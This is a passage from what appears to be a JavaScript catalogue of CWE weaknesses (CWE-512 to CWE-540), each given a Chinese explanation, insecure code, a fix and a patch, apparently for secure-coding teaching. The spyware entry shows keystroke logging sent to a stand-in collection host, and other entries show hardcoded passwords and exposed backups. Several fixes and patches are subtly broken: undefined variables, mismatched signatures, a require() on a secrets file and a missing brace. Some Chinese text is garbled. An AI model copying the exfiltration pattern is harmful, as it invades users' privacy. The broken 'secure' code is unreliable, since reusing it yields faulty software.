		refs: ['CWE-511', 'OWASP'],
		tags: ['logic-bomb','time-bomb','malicious-code','sabotage'],
	},
	{
		id: 'CWE-512',
		name: 'Spyware',
		lang: 'python',
		status: 'Complete',
		what: `間諜軟體(Spyware)。程式收集關於某人／其活動的個人可識別資訊(PII)，但它拿這些資料的方式不是靠
		使用者「明確同意或主動把資料輸進產品」，而是透過「別的資源、繞過使用者參與的途徑」——例如伴隨其它軟體偷偷安裝、
		默默記錄鍵擊、監看瀏覽行為、掃描檔案與通訊、讀取位置與聯絡人，再把收集到的資料送出去。因為沒有明確徵得同意、
		且收藏過程隱藏在使用者視線外，這在隱私面就是一種侵範性。後果是個人資料在不知情下被搜集與外送，當事人的隱私
		與可能的身分資料落到不受控制的第三方手裡，甚至被側用於日後的詐騙或傷害。修法是全面遵循「知情同意＋最小收集」：
		只在得到使用者明確授權後、以使用者看得懂的方式處理資料，不搜集不必要的欄位，所有收集行為都要有對外界可檢視的
		揭露與退出的機制，任何「偷偷送」資料的路徑都不可存在。`,
		problem: `# 不安全寫法：偷偷在背景收集按鍵與瀏覽行為,未經同意就把資料送出
def install_plugin():
    log_keystrokes()                      # 未告知即在背景取材
    upload_to("http://collect.example/t")  # 默默外送個資,無同意閘門`,
		fixed: `# 安全寫法：取得明確同意且只收「告知的最小資料」,輸出需經批准
def install_plugin():
    if not user_consented():
        opt_out(); return                 # 沒有同意就不收集
    collect_minimal(consented_fields())    # 只收使用者同意的最小欄位
    upload_to(audited_endpoint, with_notice())`,
		patch: `@@
  def install_plugin():
-    log_keystrokes()
-    upload_to("http://collect.example/t")
+    if not user_consented():
+        opt_out(); return
+    collect_minimal(consented_fields())
+    upload_to(audited_endpoint, with_notice())`,
		refs: ['CWE-512', 'OWASP'],
		tags: ['spyware','privacy','pii','collection'],
	},
	{
		id: 'CWE-515',
		name: 'Covert Storage Channel',
		lang: 'c',
		status: 'Complete',
		what: `隱蔽儲存通道(Covert Storage Channel)。一個程式透過「設定某些位元」、另一個程式透過「讀取那些位元」來
		互傳資訊，但重點是：這些位元被用來傳達「編碼過的資訊」，跟一般正常運作使用同一位元的不同之處在於此刻它們「被
		當成訊息的載體」，即使讀寫雙方沒有資料交換或被許可的關聯。典型是繞過存取控制隔離，用共享的資源（暫存檔、磁區、
		額外未使用的欄位、可寫目錄、額外 metadata）寫入「編號化訊息」，讓通訊方從讀到的刻痕反推訊息。因為這些位元在
		功能上無害、又不在任何「通訊許可」的審查範圍裡，就能遂成兩塊本該隔離的實體之間私下傳訊。後果是繞過監管邊界
		/資訊流政策的洩密或被控制方的洩漏。修法是縮小到最小共享面、抹掉可被當載體的額外欄位與狀態、進入未授權位元
		時做好清理，或對共享資源施行隨機化打散位元可逃逸的存在。`,
		problem: `// 不安全寫法：把機密位元編碼寫進「不影響功能、卻可被對方讀取」的共享欄位
int leak_secret(unsigned secret) {
    // 把 32 位元機密塞進一個「本來被忽略」的 count 欄位,對方讀值反推
    shared_flag = secret;              // 一般行程不會讀這格 -> covert 儲存通道
    return 0;
}`,
		fixed: `// 安全寫法：共享欄位在寫入敏感資訊前先中立化,且只准許正確的用途值
int leak_secret(unsigned val, int allowed) {
    if (allowed != SANCTIONED_VALUE) return 0;   // 非授權寫入拒絕
    shared_flag = normalize(val);                 // 寫入前先正規化,去掉可乘載的任意位元
    return 0;
}`,
		patch: `@@
  int leak_secret(unsigned secret) {
+    if (allowed != SANCTIONED_VALUE) return 0;
-    shared_flag = secret;
+    shared_flag = normalize(val);
      return 0;
  }`,
		refs: ['CWE-515', 'SEI CERT'],
		tags: ['covert-channel','storage','information-flow'],
	},
	{
		id: 'CWE-516',
		name: 'DEPRECATED: Covert Timing Channel',
		lang: 'c',
		status: 'Deprecated',
		what: `已棄置的條目。原指「隱蔽計時通道(Covert Timing Channel)」：透過可被計量的執行時間差異編碼傳遞資訊，
		一條隔離邊界外的程式從另邊程式的雜訊就能「讀出」秘密內容。此條目經審閱後被取消，因為它所描述的隱蔽計時通道
		弱點已收納在 CWE-385(Covert Timing Channel)之下，CWE-516 的抽象層級與重複程度不足以再獨立存在。判讀時
		勿再把 CWE-516 當現役條目引用，凡計時通道相關議題一律查 CWE-385，以計時雜訊與side-channel 的角度評估
		「可被外部量到的時間差」如何洩漏內部決策與敏感值。`,
		problem: `// （已棄置）CWE-516 與 CWE-385 重複,不再使用此編號給獨立範例
int compare_dummy(const char *a) { return timing_oracle(a); }`,
		fixed: `// 計時通道問題請依 CWE-385 評估:對所有可能的分支給一致時間,或去除可被量測的差異
int compare_ct(const char *a, const char *b) {
    return constant_time_cmp(a, b);   // 固定時間比對,不隨內容不同而洩漏計時`,
		patch: `@@
-  // CWE-385 已接替 CWE-516,勿再引用舊號
-  int compare_dummy(const char *a) { return timing_oracle(a); }
+  int compare_ct(const char *a, const char *b) {
+      return constant_time_cmp(a, b);
+  }`,
		refs: ['CWE-516', 'CWE-385'],
		tags: ['deprecated','covert-channel','timing'],
	},
	{
		id: 'CWE-520',
		name: '.NET Misconfiguration: Use of Impersonation',
		lang: 'csharp',
		status: 'Complete',
		what: `.NET 組態錯誤：使用了模擬(Impersonation)。讓 .NET 應用程式以「較高的權限層級」去執行對底層作業系統
		與檔案系統的動作，或在 ASP.NET 中開啟了成坨的〈identity impersonate="true"〉，就把整個請求處理的行程以
		「被模擬的權限」跑——若這個權限高於應用程式本應有的身分（管理者、SYSTEM、擁有全檔權限的帳號），就形同給每個
		請求一段「升級成更高權限」的執行空間。後果是任何可達的注入或弱點都變成在高權限下執行：讀寫系統檔、碰其它帳號
		資源、讓單一應用缺陷破口放大成對主機的掌控。成因是把模擬當簡單開關、沒對它所代表的權限量級做最小化與控制。修法
		只有在「一段確屬必要」的區段內、用恰好夠的帳號進行 impersonation，且主應用身分保持最小權限、不放寬到系統
		/SYSTEM 層級；不做全域的 impersonate，所有權限選擇都以最小需求與職責分離為標準。`,
		problem: `<!-- 不安全的組態:全域模擬,讓應用程式統統以升級權限執行 -->
<configuration>
  <system.web>
    <identity impersonate="true" userName="Administrator" password="..." />
  </system.web>
</configuration>`,
		fixed: `<!-- 安全組態:不全域模擬,以最小權限的應用程式身分運作 -->
<configuration>
  <system.web>
    <identity impersonate="false" />
  </system.web>
</configuration>`,
		patch: `@@
   <system.web>
-    <identity impersonate="true" userName="Administrator" password="..." />
+    <identity impersonate="false" />
   </system.web>`,
		refs: ['CWE-520', 'OWASP'],
		tags: ['impersonation','net','privilege','misconfiguration'],
	},
	{
		id: 'CWE-523',
		name: 'Unprotected Transport of Credentials',
		lang: 'javascript',
		status: 'Complete',
		what: `未受保護的憑證傳輸。登入頁或任何輸入身分／密碼的地方，在把使用者的帳號密碼從用戶端送往伺服器的「途中」
		沒有採取適當的防護——用的是明文 HTTP、沒有 TLS、或傳輸層加密不當（然而即使 HTTP 302 導到 HTTPS，最初的輸入
		依在明文段就送出了）。密碼在網路上以明文中繼站之間漫走，任何能嗅探該段網路流量的人——共用 Wi-Fi 的使用者、中間
		閘道、被綁架的 DNS+MITM——都能整筆截獲帳號密碼，再拿來登入他人帳號或嘗試重用於其它服務。後果是身分憑證在
		抵達伺服器前就被竊取，帳號被挾持、資料外洩。修法是整個登入往返與後續的敏感 session 一律在端到端 TLS 下進行、
		憑證永不經明文傳輸，同一來源註冊/更新密碼也走同一條加密通道，且全程以 HTTPS 為基底。`,
		problem: `// 不安全寫法:登入表單用明文 HTTP 送出帳密,傳輸途中一看即知
<form id="login" action="http://bank.example/login" method="POST">
  <input name="user" /><input name="pass" type="password" />
</form>`,
		fixed: `// 安全寫法:整個登入在 HTTPS (TLS) 下傳送,並以 HSTS 強制只能走加密通道
<form id="login" action="https://bank.example/login" method="POST">
  <input name="user" /><input name="pass" type="password" />
</form>
// 伺服器回應同時送出 Strict-Transport-Security: max-age=31536000; includeSubDomains`,
		patch: `@@
-  action="http://bank.example/login"
+  action="https://bank.example/login"
+  // + Strict-Transport-Security: max-age=31536000; includeSubDomains`,
		refs: ['CWE-523', 'OWASP'],
		tags: ['credentials','transport','tls','eavesdropping'],
	},
	{
		id: 'CWE-525',
		name: 'Use of Web Browser Cache Containing Sensitive Information',
		lang: 'javascript',
		status: 'Complete',
		what: `使用含敏感資訊的網頁瀏覽器快取。網頁應用程式沒有提供適切的快取政策——沒有用 Cache-Control／Pragma
		／Expires 指出「每一頁及其表單欄位」可以、或不可以被快取多深。於是回應含敏感資料（個人資料、交易明細、查詢結果、
		甚至表單輸入）的頁面可能被瀏覽器、或介於中間的快取代理存下來。接著任何人——共用同一台電腦的下一位、看得到瀏覽器
		快取的手持監看者、能讀取磁碟備份的存取者——都能「倒退一步」從仍是光榮的敏感頁瀏覽。後果是敏感內容以「看似正常
		的快取」形式留在使用者端與介質快取裡，形成被動、長期的資訊外洩。修法是對含敏感資料的回應明確發出 Cache-Control:
		no-store、Pragma: no-cache（視需要 no-cache），並同時確保同源資料的 URL 不落入公共快取；共用或敏感介面全程
		使用 HTTPS。`,
		problem: `// 不安全寫法:敏感頁回應未設快取指制,瀏覽器與中介快取會把它留下
app.get('/account', (req, res) => {
  res.send(renderAccount(req));   // 沒設 Cache-Control / Pragma,頁面含個資可被快取
});`,
		fixed: `// 安全寫法:明確用 no-store 禁止快取,敏感頁不再殘留在瀏覽器/代理快取
app.get('/account', (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.setHeader('Pragma', 'no-cache');
  res.send(renderAccount(req));
});`,
		patch: `@@
  app.get('/account', (req, res) => {
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+  res.setHeader('Pragma', 'no-cache');
    res.send(renderAccount(req));
  });`,
		refs: ['CWE-525', 'OWASP'],
		tags: ['cache','information-exposure','Cache-Control','sensitive-data'],
	},
	{
		id: 'CWE-526',
		name: 'Cleartext Storage of Sensitive Information in an Environment Variable',
		lang: 'python',
		status: 'Complete',
		what: `把敏感資訊以「明文」存進環境變數。程式把密碼、金鑰、token 等取用於作業環境變數的方式，是直接把「未加密
		的明文字串」丟進環境變數。環境變數對同一行程樹、同台機器上能列程序環境的使用者（透過 /proc、ps e、或子行程
		繼承）往往是看得見的；子行程一 fork/exec 就會原封不動繼承這些變數，任何被執行或不意觸及的子公司都能把變數裡機密
		看走或以它做惡。若這些變數還被寫進會傳出去的內容或取材於明文設定，機密就一路暴露。後果是敏感值以「人人可讀」的
		明文形式躺在作業環境裡，洩露給其它行程、使用者或備份內容。修法是避免以環境變數存放機密明文：改用受權限資料夾內的
		檔案＋程式取得後即用，或逐檔用設定保管庫／OS 密鑰環保管與解密；任何機密正文都不以明文、不需加密地出現在環境裡。`,
		problem: `# 不安全寫法:把 DB 密碼明文放在環境變數,子行程一併繼承
import os
os.environ["DB_PASS"] = "PlainTextSecret"      # 明文 & 被子行程全繼承
conn = connect(os.environ["DB_PASS"])`,
		fixed: `# 安全寫法:機密放在受權限檔案或保管庫,讀取後不複印到環境
import os, sys
with open("/run/secrets/db_pass", "r") as f:
    dbpass = f.read().strip()                  # 來自受 0600 保護檔,非環境變數
conn = connect(dbpass)`,
		patch: `@@
  import os
-  os.environ["DB_PASS"] = "PlainTextSecret"
-  conn = connect(os.environ["DB_PASS"])
+  with open("/run/secrets/db_pass", "r") as f:
+      dbpass = f.read().strip()
+  conn = connect(dbpass)`,
		refs: ['CWE-526', 'OWASP'],
		tags: ['environment','cleartext','secret','secret-management'],
	},
	{
		id: 'CWE-527',
		name: 'Exposure of Version-Control Repository to an Unauthorized Control Sphere',
		lang: 'shell',
		status: 'Complete',
		what: `把版本控制儲存庫(CVS、git 等)暴露給未授權的存取面。產品把整個或部分版的控庫放在一個可被外界存取的
		目錄、封存或其它透過網路可達的資源裡——例如把 .git/ 佈在網站可下載的根之下、把整份 repo 的壓縮檔放進公開
		下載區、或把開發用的 clone 留在既有公開資源樹內。第二方只要讀得到，就能下載整份歷史、檔案、分支與提交，從提交
		註解、.env、被誤提交的憑證、舊版本的漏洞、內部結構中把專案的秘密拆解出來。後果是原始碼、內部邏輯、機密與歴史
		敏感資料一覽無遺地流到未授權者手中，讓弱點更易被飛快發現。修法是讓版本控儲存庫絕不落在任何公開／可下載的根之下、
		封存檔不放公開下載區，並對網站根底的 .git/.svn 等路徑明確回傳 404、定期檢查沒有把 repo 壓縮外佈。`,
		problem: `# 不安全的組態:把 .git 目錄直接留在網站靜態根之下,人人可下載整份 git 歷史
# ln -s /srv/repo /var/www/html/site/.git   # 透過網址直接 GET /.git/config
# 或在公開下載區放了 repo 壓縮檔 backup.tar.gz`,
		fixed: `# 安全組態:版本庫一律放在文件根之外,網站根對 .git/.svn 回 404
# 部署產物只含 build 結果,原始碼與 .git 保留在 /srv/repo(不公開)
# Web 伺服器再加一層規則擋掉隱藏版控路徑
deny /\.git`,
		patch: `@@
-  # ln -s /srv/repo /var/www/html/site/.git
+  # 部署不含任何版本控制資料,原始庫在文件根之外
+  deny /.git`,
		refs: ['CWE-527', 'OWASP'],
		tags: ['git','repository','information-exposure','source-code'],
	},
	{
		id: 'CWE-528',
		name: 'Exposure of Core Dump File to an Unauthorized Control Sphere',
		lang: 'c',
		status: 'Complete',
		what: `把核心傾印(core dump)檔暴露給未授權存取面。程式當機時系統產生 core dump 檔，而它被生成在一個
		「可被未授權者讀到」的目錄、封存或其它存取面——例如核心傾印與崩潰排查檔放在可寫的暫存目錄、或透過網路可下載的
		位置。core dump 記錄了當下行程的完整記憶體內容，若行程處理敏感資料（解密用的金鑰、session token、連線字串、
		剛輸入的密碼），這些都以明文躺在傾印檔裡。能在傾印生成後去讀那棵目錄的人（local 共用者、能進該磁碟 /該封存的
		人）就把機密一整段拿走了。後果是核心記憶體中的敏感資料外洩、並洩漏執行狀態讓逆向更易。修法是控制 core dump
		的生成位置與權限，只讓受控的偵錯身分可讀（傳位於受保護目錄並 chmod 0600）、產品環境以 ulimit 或核心參數
		core_pattern 限縮或禁止 core 的生成，並確保任何 dump 不進入公開或共有存取面。`,
		problem: `// 不安全寫法:核心傾印寫進可寫暫存且權限不加控,本機他帳號也讀得到密鑰
int handle_crash() {
    // core mimic能導到共享可寫目錄,當機後面貌無選擇
    system("sysctl -w kernel.core_pattern=/tmp/core.%p");   // 可寫共區,權限 0644
    return 0;
}`,
		fixed: `// 安全寫法:限縮/關閉 core,或以 0600 權限導到受保護目錄
int handle_crash() {
    // 產品環境改以受控、可寫僅本行程的目錄,並限制核心傾印生成
    system("mkdir -m700 /var/crash/app");
    system("sysctl -w kernel.core_pattern=/var/crash/app/core.%p");
    return 0;
}`,
		patch: `@@
  int handle_crash() {
-    system("sysctl -w kernel.core_pattern=/tmp/core.%p");
+    system("mkdir -m700 /var/crash/app");
+    system("sysctl -w kernel.core_pattern=/var/crash/app/core.%p");
      return 0;
  }`,
		refs: ['CWE-528', 'OWASP'],
		tags: ['core-dump','information-exposure','memory','permissions'],
	},
	{
		id: 'CWE-529',
		name: 'Exposure of Access Control List Files to an Unauthorized Control Sphere',
		lang: 'shell',
		status: 'Complete',
		what: `把存取控制清單(ACL)檔案暴露給未授權存取面。產品把定義「誰能存取什麼」的 ACL／權限組態檔案放在一個
		位於意圖控制範圍之外的目錄或容器裡——例如 ACL 設定檔存進可被網路下載的目錄或快取了 ACL 的封存、或權限描述文件
		落在共享/發佈區。這些檔一讀，就把系統的授權藍圖、帳號名、群組結構、與特定資源被允許給誰這些「準登錄資訊」曝給
		未授權者。後果是攻擊者從能讀到的 ACL 直接拿到目標帳號與資源對照，大幅加速針對式存取與特權提升，也把本應只屬於
		admin 的組態細節給出去。修法是 ACL／考量權限的組態檔放在文件根之外、只允許受控組態身分讀取（權限最小化、
		目錄 private），並確保任何含 ACL 的封存與備份都不落進公開或共享存取面。`,
		problem: `# 不安全寫法:ACL 設定檔被放在網站或共享可寫區,授權藍圖翻手可得
install -m 0640 acl.conf /var/www/files/       # 網頁可下載的目錄
# GET /files/acl.conf 即把「誰能存取誰」全盤洩出一`,
		fixed: `# 安全寫法:ACL 放在受控組態目錄,權限只給組態身分
install -m 0600 acl.conf /etc/myapp/acl.conf    # 在文件根外,僅屬 root 組可控
`,
		patch: `@@
-  install -m 0640 acl.conf /var/www/files/
+  install -m 0600 acl.conf /etc/myapp/acl.conf`,
		refs: ['CWE-529', 'OWASP'],
		tags: ['acl','configuration','information-exposure','permissions'],
	},
	{
		id: 'CWE-530',
		name: 'Exposure of Backup File to an Unauthorized Control Sphere',
		lang: 'shell',
		status: 'Complete',
		what: `把備份檔暴露給未授權存取面。產品的備份檔(backup)被存進一個「未授權者可存取」的目錄、封存或其它資源——
		常見是把資料庫 dump、容器打包、連同系統檔的 tar.gz 放在網頁可下載的根、共享下載區、或權限寬鬆的暫存夾。
		備份的存在意義原本是「留存完整資料」，因此它大多包含真實資料、設定、密鑰與整棵結構；只要有人讀得到備份，等於一次
		性拿到整套資料+組態，不必費心掃任何實際破口。後果是完整資料庫、機密與設定整批外洩，歷史內容也可能因為備份涵蓋
		更廣勝過目前狀態。修法是備份一律放在文件根之外、僅備份身分與受控帳號可讀（0640 以上私有目錄）、把備份與可下載
		面徹底隔開，並加密 + 權限最小化 + 定期清理刪除舊備份。`,
		problem: `# 不安全寫法:解系統備份 tar 檔直接留在網頁可下載的目錄
# tar czf /var/www/html/backup.tar.gz /etc /srv/db
# GET /backup.tar.gz 即下載到整台含密鑰與資料庫的備份`,
		fixed: `# 安全寫法:備份放文件根外的受控目錄、權限私有且加密
# tar czf /var/backups/enc/app.enc /srv/db && chmod 600 /var/backups/enc/app.enc
# 備份根不屬於任何可透過網路發佈的目錄`,
		patch: `@@
-  tar czf /var/www/html/backup.tar.gz /etc /srv/db
+  tar czf /var/backups/enc/app.enc /srv/db && chmod 600 /var/backups/enc/app.enc`,
		refs: ['CWE-530', 'OWASP'],
		tags: ['backup','information-exposure','sensitive-data','data-leak'],
	},
	{
		id: 'CWE-531',
		name: 'Inclusion of Sensitive Information in Test Code',
		lang: 'java',
		status: 'Complete',
		what: `把敏感資訊放進測試程式碼。可存取的測試應用程式能帶來各種安全風險：開發者或管理員幾乎不會想到「除了自己
		還有人知道這些測試程式的存在」，於是很常見在測試碼裡寫死敏感資訊與功能——測試帳號的密碼、可直接造出資料的入口、
		跳過驗證的工具方法、暴露特定資料表的連線。問題惡化於這些測試應用程式常被部署到與正式同一主機、或放進可被外人
		觸發的路徑；攻擊者一掃到「測試端點」，就用裡頭寫死的機密直接登入、或以測試功能繞過正式限制。後果是測試留的
		後門式權限與寫死的密碼淪為截擊點、測試路徑洩漏內部能力。修法是測試與上線分離：測試程式碼不放進上線建置、
		不保留寫死的真實機密（一律用測試專用、並以保管機制注入）、任何測試端點預設不開啟或需正式身分認證。`,
		problem: `// 不安全寫法:測試碼寫死正式密碼並把測試入口部署上線
// GET /tests/addUser?user=admin  可直接 呼叫此方法建立帳號
class TestHelper {
    static final String ADMIN_PW = "P@ssw0rd";   // 正式密碼寫死在測試碼
    public static void forceCreate(String u){ db.create(u, ADMIN_PW); }
}`,
		fixed: `// 安全寫法:測試碼不進上線、密碼不寫死,入口一律要求正式授權
class TestHelper {
    static String adminPw() { return Secrets.store().read("test.admin.pw"); } // 保管庫
    public static void forceCreate(User self, String u){
        if (!self.isAdmin()) throw new SecurityException();
        db.create(u, adminPw());
    }
}`,
		patch: `@@
  class TestHelper {
-    static final String ADMIN_PW = "P@ssw0rd";
-    public static void forceCreate(String u){ db.create(u, ADMIN_PW); }
+    static String adminPw() { return Secrets.store().read("test.admin.pw"); }
+    public static void forceCreate(User self, String u){
+        if (!self.isAdmin()) throw new SecurityException();
+        db.create(u, adminPw());
+    }
  }`,
		refs: ['CWE-531', 'OWASP'],
		tags: ['test-code','hardcoded','information-exposure','backdoor'],
	},
	{
		id: 'CWE-533',
		name: 'DEPRECATED: Information Exposure Through Server Log Files',
		lang: 'javascript',
		status: 'Deprecated',
		what: `已棄置的條目。原指「透過伺服器日誌檔洩漏資訊」：程式把敏感資料寫入存取或錯誤日誌，之後日誌又被不當存取
		而外洩。此條目因抽象層級過低（只是某種資訊外洩的特例，並無獨立的根本成因）被取消，現已收納在 CWE-532
		(Insertion of Sensitive Information into Log File) 之下。判讀時勿再把 CWE-533 當現役編號引用，凡「敏感資料
		進入日誌」類議題一律以 CWE-532 評估——在寫入日誌的當下就要避免把 token、密碼、個資、查詢內容等機密塞進日誌，
		並保證日誌檔本身的存取權限與保留政策都受控。`,
		problem: `// （已棄置）CWE-533 已併入 CWE-532,不再用舊號
function logReq(u) { logger.info('login ' + u + ' pass=' + p); }`,
		fixed: `// 依 CWE-532:日誌不回傳在洩機密,只記無敏感字元
function logReq(u) { logger.info('login ' + u); }   // 略去任何密碼/ token`,
		patch: `@@
-  // CWE-533 已重定位到 CWE-532
-  function logReq(u) { logger.info('login ' + u + ' pass=' + p); }
+  // CWE-532:日誌不記機密
+  function logReq(u) { logger.info('login ' + u); }`,
		refs: ['CWE-533', 'CWE-532'],
		tags: ['deprecated','logging','information-exposure'],
	},
	{
		id: 'CWE-536',
		name: 'Servlet Runtime Error Message Containing Sensitive Information',
		lang: 'java',
		status: 'Complete',
		what: `Servlet 的執行時期錯誤訊息含敏感資訊。Servlet 容器在 web 應用程式碼拋出「未處理例外」時，會用預設的
		錯誤網頁把訊息原樣呈現給瀏覽器；一旦例外帶著內部細節，即時顯示出來的錯誤頁就對造訪者揭露一整套可能值觀的內部狀態。
		這類訊息常夾帶堆疊追蹤、類別與路徑、SQL 查詢內容、資料庫憑證提示、映射的執行細節——對攻擊者「提供了有用資訊」。
		後果是把 web 應用的內部架構、技術棧、可達弱點與資料結構洩露出去，方便精確瞄準與推估下一步攻擊。修法是設定自訂的
		統一錯誤頁(error-page)把所有未處理例外都轉成泛化訊息並用正確的狀態碼，詳細的堆疊與診斷只寫進伺服器端日誌、
		永遠不讓容器把原始例外輸出到用戶端，並確保生產建置關閉詳細錯誤輸出。`,
		problem: `// 不安全寫法:沒有自訂錯誤頁,容器把未處理例外的堆疊直接吐給使用者
// web.xml 未配置 error-page;例外的 stack trace 原樣顯示於瀏覽器
public String load(int id) {
    return em.find(Record.class, id).getValue();   // 例外裸露類別/路徑/SQL
}`,
		fixed: `// 安全寫法:統一錯誤頁把例外轉成泛化訊息,細節只進日誌
// web.xml:  <error-page><exception-type>
//      java.lang.Throwable</exception-type><location>/error.jsp</location></error-page>
public String load(int id) {
    try {
        return em.find(Record.class, id).getValue();
    } catch (Exception e) {
        logger.error("load failed", e);       // 堆疊進日誌,不外送
        throw new FriendlyException("not found");
    }
}`,
		patch: `@@
  public String load(int id) {
-    return em.find(Record.class, id).getValue();
+    try {
+        return em.find(Record.class, id).getValue();
+    } catch (Exception e) {
+        logger.error("load failed", e);
+        throw new FriendlyException("not found");
+    }
  }`,
		refs: ['CWE-536', 'OWASP'],
		tags: ['servlet','error-message','information-exposure','exception'],
	},
	{
		id: 'CWE-537',
		name: 'Java Runtime Error Message Containing Sensitive Information',
		lang: 'java',
		status: 'Complete',
		what: `Java 執行時期錯誤訊息含敏感資訊。當 Java 程式遭遇「未處理例外」時，執行時期產生的錯誤訊息往往連帶輸出詳細的
		堆疊、變數值、載入的類別、SQL、內部路徑與套件結構。這些訊息若透過對外介面(網頁、REST 回應、CLI 的回顯)
		顯示給使用者，就等於把執行時期一窺應用的稜鏡交出去——攻擊者可從觸發未處理例外所得到的揭密，推斷架構與弱點位置。
		許多情況下，攻擊模式就是「故意觸發會拋出未處理例外的條件」，藉此把錯誤訊息當成資訊來源，再進一步部署未授權取用。
		後果是內部剖析與技術棧細節外洩給敵方、弱點更容易被鎖定與落實攻擊。修法是全域擷取所有例外並輸出泛化訊息；詳細的
		堆疊只記入受保護的伺服器端日誌；對外的錯誤一律以固定文案與合適狀態碼回應，藉此斷絕「以例外當情報源」的做法。`,
		problem: `// 不安全寫法:把例外 toString 直接送給呼叫端,執行時期細節外洩
public String run(String op) {
    try {
        return doOp(op);
    } catch (Exception e) {
        return e.toString();          // 含 class/stack/內部值,直接外送
    }
}`,
		fixed: `// 安全寫法:例外細節只進日誌,對外一律泛化訊息
public String run(String op) {
    try {
        return doOp(op);
    } catch (Exception e) {
        log.warn("op failed={}", op, e);   // 堆疊在伺服器端
        return "operation failed";            // 對外不露內部資訊
    }
}`,
		patch: `@@
  public String run(String op) {
      try {
          return doOp(op);
      } catch (Exception e) {
-        return e.toString();
+        log.warn("op failed={}", op, e);
+        return "operation failed";
      }
  }`,
		refs: ['CWE-537', 'OWASP'],
		tags: ['java','error-message','information-exposure','exception'],
	},
	{
		id: 'CWE-538',
		name: 'Insertion of Sensitive Information into Externally-Accessible File or Directory',
		lang: 'javascript',
		status: 'Complete',
		what: `把敏感資訊放進「外部可存取」的檔或目錄。程式把敏感資料寫進一個「本屬可被授權者存取」、但對「那份敏感的
		內容」而言不該存在於此的檔案/目錄——重點在於：檔案或目錄本身對某群人「開放」（他們有資格看這些檔），但裡頭的
		特定敏感資訊並不在該群可看範圍內。典型是日誌、診斷輸出、快取、健康檢查檔被放在記錄敏感內容的根或可下載目錄，
		一群能讀那份公開日誌的人於是也讀到token／SQL／個資。後果是敏感資訊出現在「與它安全級別不符」的可存取空間，
		被看得到該檔的人意外取得。修法是建立「資料分級+輸出位置」的對應規則：只把某層級資料寫進同等級受控的存放區、對外
		/低權群只剩消毒與泛化的版本，且任何輸出到公共目錄的內容都不含 token、金鑰、個資等機密。`,
		problem: `// 不安全寫法:把含查詢/憑證的日誌寫進可直接下載的公開目錄
const fs = require('fs');
fs.appendFileSync('public/debug.log',  // 該目錄人人可 GET
  JSON.stringify({ query, dsn })      // dsn 含資料庫連線密碼進公共檔
);`,
		fixed: `// 安全寫法:機密欄位剝除後才准寫入對外可見檔,日誌轉受控目錄
const fs = require('fs');
fs.appendFileSync('/var/log/app/app.log',        // 受控目錄
  JSON.stringify({ query: redact(query) }));     // 無 dsn、無任何機密`,
		patch: `@@
  const fs = require('fs');
-  fs.appendFileSync('public/debug.log',
-    JSON.stringify({ query, dsn }));
+  fs.appendFileSync('/var/log/app/app.log',
+    JSON.stringify({ query: redact(query) }));`,
		refs: ['CWE-538', 'OWASP'],
		tags: ['information-exposure','sensitive-data','external-access','logging'],
	},
	{
		id: 'CWE-539',
		name: 'Use of Persistent Cookies Containing Sensitive Information',
		lang: 'javascript',
		status: 'Complete',
		what: `使用「持久性 Cookie」並在其中存放敏感資訊。web 應用利用持久(Cookie 不設過期或過期很長) cookie，
		而不只在單次 session 內使用，而且把敏感內容——身分、授權 token、個人資料、設定盲眼——直接放進這個會長期留在
		使用者瀏覽器裡、且每次請求都要一起送出的 cookie。持久 cookie 的資料「留存時間較長」、隨每次請求被送上並多半以
		明文經由 HTTP 傳輸(除非 Secure)，因此更長時間地暴露給瀏覽器歷史／快取／共享機器以及中介流量。持久個人資料如果
		又被複雜符號，等於把長存、可截獲的現成身分認證交出來。後果是敏感與身分資料在長時間窗內反覆暴露、攜帶誘因與
		被竊權面都放大。修法是敏感資訊不放 cookie：改用 HttpOnly + Secure + SameSite 的 session token(資料只在伺服器)，
		不要把身分或個資直接序列化進持久 cookie，並設合理過期與不儲存重大機密。`,
		problem: `// 不安全寫法:持久 cookie 直接存身分與偏好個資,長存且明文隨請求外送
res.setHeader('Set-Cookie',
  'profile=' + encodeURIComponent(JSON.stringify({user:'alice', role:'admin', ssn:'...'} ))
  + '; Path=/; Expires=Fri, 01 Jan 2030 00:00:00 GMT' + '; ');`,
		fixed: `// 安全寫法:只用 HttpOnly+Secure+SameSite 的 session token,cookie 本身不帶個資身分
res.setHeader('Set-Cookie',
  'sid=' + sessionId + '; HttpOnly; Secure; SameSite=Lax; Path=/');`,
		patch: `@@
-  res.setHeader('Set-Cookie',
-    'profile=' + encodeURIComponent(JSON.stringify({user:'alice', role:'admin', ssn:'...'}))
-    + '; Path=/; Expires=Fri, 01 Jan 2030 00:00:00 GMT' + '; ');
+  res.setHeader('Set-Cookie',
+    'sid=' + sessionId + '; HttpOnly; Secure; SameSite=Lax; Path=/');`,
		refs: ['CWE-539', 'OWASP'],
		tags: ['cookie','session','information-exposure','persistent'],
	},
	{
		id: 'CWE-540',
		name: 'Inclusion of Sensitive Information in Source Code',
		lang: 'javascript',
		status: 'Complete',
		what: `把敏感資訊包含在原始碼之中。web 伺服器或儲存庫上所放的原始碼往往夾帶大量的敏感資訊──寫死的密碼、金鑰、
		API token、資料庫連線字串、內部 IP 與路徑——而且這些原始碼常落在可被讀取的位置：伺服器文件根下的 .js/.html 可下載、
		儲存庫公開 clone、除錯腳本外洩。攻擊者只要拿到原始碼（下載公開 JS、clone 到公開 repo、利用備份／洩漏），裡面寫死
		的機密就整把到手。它的危險在於「平常以為原始碼不外流」，一但破口存在就等於送出整套秘密與邏輯。後果是硬編碼憑證與
		內部細節外洩、為後續直接登入／重用／逆向鋪路。修法是原始碼絕不落可存取面、機密一律從環境/保管庫注入、在 repo
		的掃描(codesecrets, pre-commit secrets 檢查)把寫死的密鑰擋在提交外、清理已誤提交的歷史。`,
		problem: `// 不安全寫法:硬編碼密鑰直接寫在會被下載的原始碼/公開 repo 中
const db = require('db');
const PASS = 'S3cretDBPassword';   // repo clone/靜態下載即可取得;硬編碼洩漏機密
`,
		fixed: `// 安全寫法:機密從保管庫注入,程式碼本身不含任何硬編碼密鑰
const db = require('db');
const PASS = process.env.DB_PASS ?? require('/run/secrets/db_pass').trim();
`,
		patch: `@@
  const db = require('db');
-  const PASS = 'S3cretDBPassword';
+  const PASS = process.env.DB_PASS ?? readSecret('db_pass');`,
		refs: ['CWE-540', 'OWASP'],
		tags: ['hardcoded','source-code','information-exposure','secrets'],
	},
	{
		id: 'CWE-541',
		name: 'Inclusion of Sensitive Information in an Include File',
		lang: 'javascript',
